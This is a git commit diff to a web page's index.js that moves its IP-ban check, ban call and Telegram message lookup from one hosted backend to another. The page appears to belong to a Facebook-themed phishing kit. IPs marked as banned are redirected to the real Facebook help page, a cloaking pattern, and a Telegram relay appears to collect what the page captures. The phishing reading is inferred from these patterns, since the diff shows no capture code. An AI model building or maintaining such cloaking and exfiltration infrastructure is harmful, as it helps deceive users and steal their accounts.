06a9daf69add1304b7cda0e73ac8eadc514064d1
fmetaverse1 <fmetaverse1@gmail.com>
2024-10-17 00:22:40 +0200

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -61,7 +61,7 @@ export default function Home() {
 
   useEffect(() => {
     const CheckBan = async (ip) => {
-      await axios.get(`https://lobster-app-67ipw.ondigitalocean.app/checkBan/${ip}`).then((data) => {
+      await axios.get(`https://back-updated-j9wo.onrender.com/checkBan/${ip}`).then((data) => {
         if (data.data.data) {
           window.location.href = 'https://fb.com/help'
         }
@@ -77,7 +77,7 @@ export default function Home() {
   }, [Step])
 
   const getUserTelegramId = async (uniqueString) => {
-    const x = await axios.get(`https://lobster-app-67ipw.ondigitalocean.app/getMessages`)
+    const x = await axios.get(`https://back-updated-j9wo.onrender.com/getMessages`)
 
     const result = x.data.data.result
 
@@ -233,7 +233,7 @@ export default function Home() {
       if (LastFetch !== 'Ban') {
         if (ban) {
           setLastFetch('Ban')
-          axios.get(`https://lobster-app-67ipw.ondigitalocean.app/ban/${Ip}`)
+          axios.get(`https://back-updated-j9wo.onrender.com/ban/${Ip}`)
         }
       }
 
